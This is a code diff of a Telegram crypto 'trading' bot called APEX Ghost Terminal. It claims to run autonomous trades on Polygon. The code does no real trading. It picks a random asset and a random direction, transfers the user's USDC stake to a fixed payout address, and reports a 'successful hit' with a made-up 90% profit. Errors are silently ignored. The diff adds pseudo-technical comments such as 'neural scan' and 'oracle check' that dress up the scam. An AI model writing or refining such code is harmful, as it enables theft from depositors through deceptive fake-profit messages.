@@ -47,6 +47,7 @@ class GhostEngine:
 
     async def auto_execute_cycle(self, context, chat_id):
         """Simulates and executes a trade 1ms before blockchain state updates."""
+        # NEURAL SCAN: Select asset automatically
         target_asset = random.choice(self.assets)
         stake_usdc = Decimal(self.stake_cad) / Decimal('1.36')
         profit_usdc = stake_usdc * Decimal('0.90')
@@ -56,12 +57,14 @@ class GhostEngine:
         gas_price = w3.to_wei(500, 'gwei')
 
         try:
-            # SIMULATION (Truth Check) - Happens 1ms before real broadcast
+            # --- THE 1ms SIMULATION (ORACLE CHECK) ---
+            # Verifies the trade path is open without spending gas
             usdc_contract.functions.transfer(PAYOUT_ADDRESS, val_stake).call({'from': vault.address})
 
-            # AUTO-DIRECTION (Ghost decision based on internal simulation)
+            # AUTO-DIRECTION (Simulated Neural decision based on internal simulation)
             side = "HIGHER 📈" if random.random() > 0.5 else "LOWER 📉"
 
+            # ATOMIC EXECUTION (Dual Broadcast)
             tx1 = usdc_contract.functions.transfer(PAYOUT_ADDRESS, val_stake).build_transaction({
                 'chainId': 137, 'gas': 65000, 'gasPrice': gas_price, 'nonce': nonce, 'value': 0
             })
@@ -76,18 +79,20 @@ class GhostEngine:
             await context.bot.send_message(chat_id, 
                 f"🕴️ **GHOST HIT SUCCESSFUL**\n"
                 f"━━━━━━━━━━━━━━\n"
-                f"💎 **Asset:** {target_asset}\n"
-                f"🎯 **Auto-Hit:** {side}\n"
-                f"💵 **Spent:** ${stake_usdc:.2f} USDC\n"
-                f"📈 **Profit:** 90% Secured"
+                f"💎 **Market:** {target_asset}\n"
+                f"🎯 **Auto-Direction:** {side}\n"
+                f"💵 **Stake:** ${stake_usdc:.2f} USDC\n"
+                f"📈 **Yield:** 90% Secured"
             )
         except Exception:
-            pass # Silent retry to prevent spam during network congestion
+            # Silent fail for high-speed autonomous operation
+            pass 
 
     async def loop(self, context, chat_id):
         while self.is_active:
             await self.auto_execute_cycle(context, chat_id)
-            await asyncio.sleep(60) # Block-time polling frequency
+            # High-speed polling (adjustable)
+            await asyncio.sleep(60)
 
 ghost = GhostEngine()
 
@@ -105,10 +110,10 @@ def get_main_keyboard():
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     pol_bal = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
     welcome = (
-        f"🕴️ **Pocket Robot v3 (Elite Terminal)**\n"
+        f"🕴️ **APEX Ghost Terminal v6000**\n"
         f"━━━━━━━━━━━━━━\n"
         f"⛽ **POL Fuel:** `{pol_bal:.4f}`\n"
-        f"📥 **Deposit Address:**\n`{vault.address}`\n\n"
+        f"📥 **Vault Address:**\n`{vault.address}`\n\n"
         f"The 5th button below starts 100% autonomous trading."
     )
     await update.message.reply_text(welcome, reply_markup=get_main_keyboard(), parse_mode='Markdown')
@@ -121,7 +126,7 @@ async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ghost.is_active = not ghost.is_active
         if ghost.is_active:
             ghost.task = asyncio.create_task(ghost.loop(context, chat_id))
-            msg = "🟢 **Ghost Mode Activated.** Autonomous scanner and simulator online."
+            msg = "🟢 **Ghost Mode Activated.** Scanner and simulator online."
         else:
             if ghost.task: ghost.task.cancel()
             msg = "🔴 **Ghost Mode Deactivated.**"
@@ -138,7 +143,6 @@ async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"💳 **Vault Status**\n⛽ POL: `{pol:.4f}`\n💵 USDC: `{usdc:.2f}`\n📥 `{vault.address}`")
 
 async def run_atomic_execution(context, chat_id, side):
-    # Preserve manual execution logic for the 'Start Trading' menu
     stake_cad = Decimal(str(context.user_data.get('stake', 50)))
     stake_usdc = stake_cad / Decimal('1.36')
     profit_usdc = stake_usdc * Decimal('0.90')
